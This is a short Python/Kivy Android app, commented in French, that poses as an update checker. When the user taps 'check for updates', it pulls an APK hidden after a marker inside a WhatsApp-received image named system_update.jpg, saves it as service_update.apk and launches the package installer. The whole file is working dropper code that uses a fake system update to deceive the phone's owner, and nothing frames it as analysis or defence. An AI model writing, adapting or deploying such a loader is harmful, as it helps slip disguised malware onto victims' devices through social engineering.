from kivy.app import App
from kivy.uix.button import Button
from android.permissions import request_permissions, Permission
import os

class NemosLoader(App):
    def build(self):
        # On demande les permissions dès le lancement
        request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
        return Button(text="Vérifier les mises à jour", on_press=self.process)

    def process(self, instance):
        # Chemin typique des documents reçus par WhatsApp
        img_path = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents/system_update.jpg"
        out_apk = "/sdcard/Download/service_update.apk"
        marker = b"NEMOS_BOUNDARY"

        if os.path.exists(img_path):
            with open(img_path, "rb") as f:
                content = f.read()
            
            if marker in content:
                # Extraction propre
                parts = content.split(marker)
                with open(out_apk, "wb") as f_out:
                    f_out.write(parts[1])
                
                # Lancement de l'installation via Intent Android
                from jnius import autoclass
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                Intent = autoclass('android.content.Intent')
                Uri = autoclass('android.net.Uri')
                File = autoclass('java.io.File')
                
                file_obj = File(out_apk)
                intent = Intent(Intent.ACTION_VIEW)
                intent.setDataAndType(Uri.fromFile(file_obj), "application/vnd.android.package-archive")
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                PythonActivity.mActivity.startActivity(intent)
            else:
                instance.text = "Aucune mise à jour (Marqueur manquant)"
        else:
            instance.text = "Erreur : Document introuvable"

if __name__ == '__main__':
    NemosLoader().run()
